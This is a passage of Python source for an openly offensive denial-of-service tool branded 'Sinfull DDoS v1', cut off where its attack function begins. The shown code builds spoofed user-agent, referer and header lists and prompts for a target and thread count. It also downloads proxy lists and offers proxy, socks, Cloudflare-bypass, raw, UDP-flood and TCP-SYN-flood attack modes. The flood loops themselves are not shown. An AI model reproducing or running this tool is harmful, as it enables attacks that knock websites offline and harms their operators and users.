    "Mozilla/4.78 (Windows 2000; U) Opera 6.01  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.01  [it]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.01  [et]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.01  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.01  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.01  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 6.01  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 6.01  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.01  [it]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.01  [fr]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.01  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.01  [de]",
    "More Opera 6.01 user agents strings -->>",
    "Opera/6.0 (Windows XP; U)  [de]",
    "Opera/6.0 (Windows ME; U)  [de]",
    "Opera/6.0 (Windows 2000; U)  [fr]",
    "Opera/6.0 (Windows 2000; U)  [de]",
    "Opera/6.0 (Macintosh; PPC Mac OS X; U)",
    "Mozilla/4.76 (Windows NT 4.0; U) Opera 6.0  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.0  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.0  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 6.0  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.0 [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.0  [fr]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.0  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.0 [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.0  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Mac_PowerPC) Opera 6.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Mac_PowerPC) Opera 6.0  [de]",
    "More Opera 6.0 user agents strings -->>",
    "Opera/5.12 (Windows NT 5.1; U)  [de]",
    "Opera/5.12 (Windows 98; U)  [en]",
    "Mozilla/5.0 (Windows 98; U) Opera 5.12  [de]",
    "Mozilla/4.76 (Windows NT 4.0; U) Opera 5.12  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 5.12  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.12  [it]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.12  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 5.12  [it]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 5.12  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 5.12  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Mac_PowerPC) Opera 5.12  [en]",
    " Opera/5.12 (Windows NT 5.1; U)  [de]",
    "Opera/5.11 (Windows 98; U)  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 5.11  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]",
    "Opera/5.02 (Windows 98; U)  [en]",
    "Opera/5.02 (Macintosh; U; id)",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.1) Opera 5.02  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 5.02  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 5.02  [en]",
    " Opera/5.02 (Windows NT 5.0; U) [en]",
    "Opera/5.0 (Ubuntu; U; Windows NT 6.1; es; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13",
    "Opera/5.0 (SunOS 5.8 sun4u; U)  [en]",
    "Mozilla/5.0 (SunOS 5.8 sun4u; U) Opera 5.0 [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.8 sun4u) Opera 5.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Mac_PowerPC) Opera 5.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux) Opera 5.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.4-4GB i686) Opera 5.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.0-4GB i686) Opera 5.0  [en]",
    "Opera/4.02 (Windows 98; U) [en]",
    "Mozilla/5.0 (Macintosh; ; Intel Mac OS X; fr; rv:1.8.1.1) Gecko/20061204 Opera",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE) Opera",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
    "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0",
    "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:23.0) Gecko/20131011 Firefox/23.0",
    "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
    "Mozilla/5.0 (Microsoft Windows NT 6.2.9200.0); rv:22.0) Gecko/20130405 Firefox/22.0",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:21.0.0) Gecko/20121011 Firefox/21.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20130514 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130331 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64;) Gecko/20100101 Firefox/20.0",
    "Mozilla/5.0 (Windows x86; rv:19.0) Gecko/20100101 Firefox/19.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/19.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/18.0.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0)  Gecko/20100101 Firefox/18.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6",
    "Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.0",
    "Mozilla/6.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
    "Mozilla/5.0 (X11; NetBSD amd64; rv:16.0) Gecko/20121102 Firefox/16.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.16) Gecko/20120427 Firefox/15.0a1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:15.0) Gecko/20120910144328 Firefox/15.0.2",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:15.0) Gecko/20121011 Firefox/15.0.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:14.0) Gecko/20120405 Firefox/14.0a1",
    "Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20120405 Firefox/14.0a1",
    "Mozilla/5.0 (Windows NT 5.1; rv:14.0) Gecko/20120405 Firefox/14.0a1",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64; en-US; rv:2.0.4) Gecko/20120718 AskTbAVR-IDW/3.12.5.17700 Firefox/14.0.1",
    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/14.0.1",
    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/ 20120405 Firefox/14.0.1",
    "Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1",
    "Mozilla/5.0 (Windows NT 5.1; rv:15.0) Gecko/20100101 Firefox/13.0.1",
    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
    "Mozilla/5.0 (Windows NT 6.1; de;rv:12.0) Gecko/20120403211507 Firefox/12.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
    "Mozilla/5.0 (compatible; Windows; U; Windows NT 6.2; WOW64; en-US; rv:12.0) Gecko/20120403211507 Firefox/12.0",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Firefox/11.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0",
    "Mozilla/5.0 (Windows NT 6.1; U;WOW64; de;rv:11.0) Gecko Firefox/11.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0",
    "Mozilla/6.0 (Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4) Gecko/2012010317 Firefox/10.0a4",
    "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4) Gecko/2012010317 Firefox/10.0a4",
    "Mozilla/5.0 (X11; Mageia; Linux x86_64; rv:10.0.9) Gecko/20100101 Firefox/10.0.9",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0a2) Gecko/20111101 Firefox/9.0a2",
    "Mozilla/5.0 (Windows NT 6.2; rv:9.0.1) Gecko/20100101 Firefox/9.0.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:8.0; en_us) Gecko/20100101 Firefox/8.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/7.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110612 Firefox/6.0a2",
    "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:6.0) Gecko/20100101 Firefox/6.0 FirePHP/0.6",
    "Mozilla/5.0 (Windows NT 5.0; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0",
    "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:5.0a2) Gecko/20110524 Firefox/5.0a2",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/5.0.1",
    "Mozilla/5.0 (Windows NT 6.1; U; ru; rv:5.0.1.6) Gecko/20110501 Firefox/5.0.1 Firefox/5.0.1",
    "mozilla/3.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/5.0.1",
    "Mozilla/5.0 (X11; U; Linux i586; de; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (X11; U; Linux amd64; rv:5.0) Gecko/20100101 Firefox/5.0 (Debian)",
    "Mozilla/5.0 (X11; U; Linux amd64; en-US; rv:5.0) Gecko/20110619 Firefox/5.0",
    "Mozilla/5.0 (X11; Linux) Gecko Firefox/5.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 FirePHP/0.5",
    "Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Firefox/5.0",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko Firefox/5.0",
    "Mozilla/5.0 (X11; Linux ppc; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (X11; Linux AMD64) Gecko Firefox/5.0",
    "Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20110619 Firefox/5.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (Windows NT 6.1.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Mozilla/5.0 (Windows NT 5.2; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",]

ref = ['http://help.baidu.com/searchResult?keywords=',
'http://www.bing.com/search?q=',
'https://www.yandex.com/yandsearch?text=',
'https://duckduckgo.com/?q=',
'http://www.ask.com/web?q=',
'http://search.aol.com/aol/search?q=',
'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
'https://drive.google.com/viewerng/viewer?url=',
'http://validator.w3.org/feed/check.cgi?url=',
'http://host-tracker.com/check_page/?furl=',
'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
'http://jigsaw.w3.org/css-validator/validator?uri=',
'https://add.my.yahoo.com/rss?url=',
'http://www.google.com/?q=',
'http://www.usatoday.com/search/results?q=',
'http://engadget.search.aol.com/search?q=',
'https://steamcommunity.com/market/search?q=',
'http://filehippo.com/search?q=',
'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
'http://eu.battle.net/wow/en/search?q=',
'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
',https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer'
'/sharer.php?u=',
',https://drive.google.com/viewerng/viewer?url=',
',https://www.google.com/translate?u=',]

acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
"Accept-Encoding: gzip, deflate\r\n", 
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept: text/html, application/xhtml+xml",
"Accept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]    

black_lists = ["chinhphu.vn/", "baochinhphu.vn/"]

def logo():
    if sys.platform.startswith("linux"):
        os.system('clear')
    elif sys.platform.startswith("freebsd"):
        os.system('clear')
    else:
        os.system('color ' +random.choice(['4', 'd', '5', 'c'])+ " & cls & title Sinfull DDoS v1, QS3Ci")
    print('''
                 .                                                      .
               .n                                                        n.
         .   .dP                     ╔═╗╦╔╗╔╔═╗╦ ╦╦  ╦                    9b.    .
        4    qXb         .           ╚═╗║║║║╠╣ ║ ║║  ║             .      dXp     t
       dX.    9Xb      .dXb    __    ╚═╝╩╝╚╝╩  ╚═╝╩═╝╩═╝  __    dXb.     dXP     .Xb
       9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
        9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
         `9XXXXXXXXXXXXXXXXXXXXX'     `OOO8b   d8OOO'     `XXXXXXXXXXXXXXXXXXXXXP'
           `9XXXXXXXXXXXP' `9XX'    0     `98v8P'     0    `XXP' `9XXXXXXXXXXXP'
               ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                               )b.  .dbo.dP'`v'`9b.odb.  .dX(
                             ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                            dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                           dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                           9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                            `'      9XXXXXX(   )XXXXXXP      `'
                                     XXXX X.`v'.X XXXX
                                     XP^X'`b   d'`X^XX
                                     X. 9  `   '  P )X
                                     `b  `       '  d'
                                      `             ''')                                               
    try:
        print("\n[*] Target : " +str(url_main)+ ":" +str(port))
    except:
        pass
    try:
        print("[*] Method : " +str(name_method_attack))
    except:
        pass
    try:
        print("[*] Mode   : " +str(filenam2))
    except:
        pass
    try:
        print("[*] Bypass : v" +str(method_pass_cf))
        
    except:
        pass
    try:
        print("[*] Proxies: %s" %(len(open(out_file).readlines())))
    except:
        pass
    try:
        print("[*] Threads: " +str(threads))
    except:
        pass

def start_url():
    global url, url_main, host_url, host_ip, port
    if sys.platform.startswith("linux"):
        pass
    elif sys.platform.startswith("freebsd"):
        pass
    else:
        path = "C:/Program Files/nodejs/node.exe"
        if (not os.path.isfile(path)):
            print("[!] Please Install NodeJs. Downloading... [!]")
            down = wget.download("https://nodejs.org/dist/v12.13.0/node-v12.13.0-x64.msi")
            down
            os.system("node-v12.13.0-x64.msi")
    logo()
    url = input("\n[%] Target: ").strip()
    if url == "":
        start_url()
    url_main = url
    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
    except:
        print("[!] You Mistyped, Try Again [!]")
        start_url()
    logo()
    try:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0]
    if host_url in black_lists:
       print("\n[X] ERROR: Site In Backlits")
       sleep(4)
       url      = ""
       url_main = ""
       start_url()
    host_ip = socket.gethostbyname(host_url)
    start_port()
    logo()
    choice_method_attack()

def start_port():
    global port
    print("-----------------------------")
    port = str(input("[*] Port [https 443 http 80]: "))
    if port == '':
        if "https" in url:
                port = int(443)
                print("[!] Selected Port = 443 [!]")
        else:
            port = int(80)
            print("[!] Selected Port = 80 [!]")
    else:
        port = int(port)

def proxies_list():
    global fileproxies, proxies, out_file
    print("-----------------------------")
    if sys.platform.startswith("linux"):
        pass
    elif sys.platform.startswith("freebsd"):
        pass
    else:
        for file in glob("*.txt"):
            print("|_--> " + file)
    out_file = str(input("[+] " +str(filenam2)+ " [" +str(filenam1)+ ".txt]: "))
    if out_file == "":
        out_file = str(filenam1)+".txt"
    proxies = open(out_file).readlines()
    #print ("[!] Number Of Proxies: %s" %(len(open(out_file).readlines())))
    logo()
    numthreads()

def proxyget():
    global out_file, proxies
    out_file = str(filenam1)+".txt"
    f = open(out_file,'wb')
    r1 = requests.get(urlproxy)
    f.write(r1.content)
    f.close() 
    proxies = open(out_file).readlines()
    #print("[!] Get Proxies Successfully ( Live 100% ) [" +out_file+ "] = [ " +str(len(open(out_file).readlines()))+ " ]")
    logo()
    numthreads()

def start_mode():
    global choice_mode, filenam1, filenam2, method_pass_cf
    print("""
[layer 7]
->0 Home  [BinhDuong]
->1 Proxy [DDoS]
->2 Socks [DDoS]
->3 JS-Normal [bypass method]
->4 Raw-DoS [Dos]
[layer4]
->5 UDP Flood [DDoS]
->6 TCP-SYN Flood [DDoS]
""")
    choice_mode = input("[*] Attack Mode [0-6]: ")
    if choice_mode == "0":
        filenam2 = "Home"
        logo()
        numthreads()
    elif choice_mode == "1":
        choice_mode = "1"
        filenam1 = "proxy"
        filenam2 = "Proxy"
        logo()
        choice_down_proxies()
    elif (choice_mode == "2") or (choice_mode == ""):
        choice_mode = "2"
        filenam1 = "socks"
        filenam2 = "Socks"
        logo()
        choice_down_proxies()
    elif choice_mode == "3":
        print("=> 1: Method Bypass v1")
        print("=> 2: Method Bypass v2")
        filenam2 = "JS-Bypass"
        method_pass_cf = input("[?] Method [1/2]: ")
        if (method_pass_cf == "") or (method_pass_cf == "1"):
            print("[!] Selected Method Bypass v1")
            method_pass_cf = "1"
        else:
            print("[!] Selected Method Bypass v2")
            method_pass_cf = "2"
        logo()
        pass_cf()
    elif choice_mode == "4":
        filenam2 = "Raw-DoS"
        logo()
        numthreads()
    elif choice_mode == "5":
        filenam2 = "UDP Flood"
        logo()
        numthreads()
    elif choice_mode == "6":
        filenam2 = "TCP-SYN Flood"
        logo()
        numthreads()
    else:
        print ("[!] You mistyped, try again [!]\n")
        start_mode()

error_cf = int(0)

def pass_cf():
    global user, cookie, soso, scraper, error_cf
    if "https" in url:
        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
    try:
        if method_pass_cf == "1":
            cookie, user = cfscrape.get_cookie_string(url)
        else:
            scraper = cfscrape.create_scraper()
            soso    = scraper.get(url, timeout=15)
        print("[!] Bypass Has Been Completed :D!")
        numthreads()
    except:
        error_cf += 1
        print("[!] Bypassing Again... [" +str(error_cf)+ "]")
        if error_cf>5:
            os.system("cls")
            print("[!] Bypass fail:(\n[!] Please Select Another Attack Or Ignore Method[!]")
            start_mode()
        else:
            pass_cf()

def choice_method_attack():
    global method_attack, name_method_attack
    print("=> Request [ Normal ]")
    print("=> Request [  Spam  ]")
    method_attack = input("[*] Choice Request [1/2]: ")
    if (method_attack == "1") or (method_attack == ""):
        name_method_attack = "Normal"
        print("[!] Selected Method Attack Normal")
        method_attack = "1"
    elif method_attack == "2":
        name_method_attack = "Spam"
        print("[!] Selected Method Attack Spam")
    else:
        print ("[!] You mistyped, try again [!]\n")
        choice_method_attack()
    logo()
    start_mode()

def choice_down_proxies():
    global urlproxy, urlproxy, sel_pr
    choice4 = input("[?] Get New List " +str(filenam2)+ " [Y/N]: ")
    if (choice4 == "y") or (choice4 == "Y"):
        print("=> 1: Server X")
        print("=> 2: Server Z")
        sel_pr = input("[?] Server Get [1/2]: ")
        if choice_mode == "proxy":
            if sel_pr == "1":
                urlproxy = "https://www.proxy-list.download/api/v1/get?type=http"
            else:
                urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all&ssl=yes&anonymity=all"
        else:
            if sel_pr == "1":
                urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks5"
            else:
                urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=all"
        proxyget()
    else:
        print("[!] Selected No Get New List " +str(filenam2)+ " [!]")
        proxies_list()

def numthreads():
    global threads
    try:
        print("-----------------------------")
        threads = int(input("[*] Threads [1000]: "))
    except ValueError:
        threads = int(2000)
        print ("[!] Selected Threads " +str(threads)+ " [!]\n")
    logo()
    begin()

def begin():
    choice6 = input('Press "Enter" to start attack: ')
    if choice6 == "":
        if ("edu" in url) or ("vn" in url) or ("hentai" in url) or ("porn" in url):
            print("Adu mày chiến đấy=))")
            sleep(3)
        attack()
        print()
    else:
        sys.exit()

def attack():
    global threads, get_host, acceptall, connection, content, length, x, req_code, error, max_req, multiple
    x     = int(0)
    error = int(0)
    req_code = int(0)
